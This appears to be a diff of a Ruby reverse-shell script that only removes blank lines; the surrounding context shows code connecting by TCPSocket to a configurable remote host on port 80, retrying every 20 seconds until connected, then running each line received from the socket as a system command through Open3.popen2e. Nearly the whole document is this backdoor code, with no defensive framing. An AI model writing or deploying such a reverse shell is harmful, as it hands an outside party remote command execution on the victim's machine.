@@ -6,7 +6,6 @@ RHOST = ""
 
 PORT = 80
 
-
     begin
         sock = TCPSocket.new "#{RHOST}", "#{PORT}"
         sock.puts "[\033[1;92m*\033[1;97m] Connected!"
@@ -15,7 +14,6 @@ PORT = 80
           sleep 20
           retry
         end
-
         begin
           while line = sock.gets
             Open3.popen2e("#{line}") do | stdin, stdout_and_stderr |
@@ -25,4 +23,3 @@ PORT = 80
         rescue
           retry
     end
-
